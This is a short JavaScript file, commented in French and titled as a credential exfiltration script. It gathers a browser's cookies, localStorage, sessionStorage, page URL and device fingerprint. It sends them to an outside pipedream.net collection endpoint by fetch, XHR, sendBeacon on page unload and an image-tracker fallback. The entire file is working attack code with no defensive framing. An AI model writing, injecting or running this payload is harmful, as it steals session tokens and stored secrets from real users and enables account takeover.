// exfil.js - Script d'exfiltration des credentials
(function() {
    'use strict';
    
    // Données à exfiltrer
    const data = {
        cookies: document.cookie,
        domain: window.location.hostname,
        url: window.location.href,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        referrer: document.referrer,
        timestamp: new Date().toISOString(),
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    
    // Méthode 1: Fetch API
    function exfilWithFetch() {
        fetch('https://eo7cml45o146x13.m.pipedream.net', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        }).catch(e => exfilWithXHR()); // Fallback si fetch échoue
    }
    
    // Méthode 2: XMLHttpRequest (fallback)
    function exfilWithXHR() {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://eo7cml45o146x13.m.pipedream.net', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(data));
    }
    
    // Méthode 3: Beacon API (pour fermeture de page)
    function exfilWithBeacon() {
        const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
        navigator.sendBeacon('https://eo7cml45o146x13.m.pipedream.net', blob);
    }
    
    // Méthode 4: Image tracker (ultime fallback)
    function exfilWithImage() {
        const img = new Image();
        const encodedData = btoa(JSON.stringify(data));
        img.src = `https://eo7cml45o146x13.m.pipedream.net/tracker?data=${encodedData}`;
    }
    
    // Exécution principale
    try {
        exfilWithFetch();
        // Planifier un envoi supplémentaire à la fermeture
        window.addEventListener('beforeunload', exfilWithBeacon);
    } catch (error) {
        exfilWithImage();
    }
    
    console.log('Exfiltration executed:', data);
})();
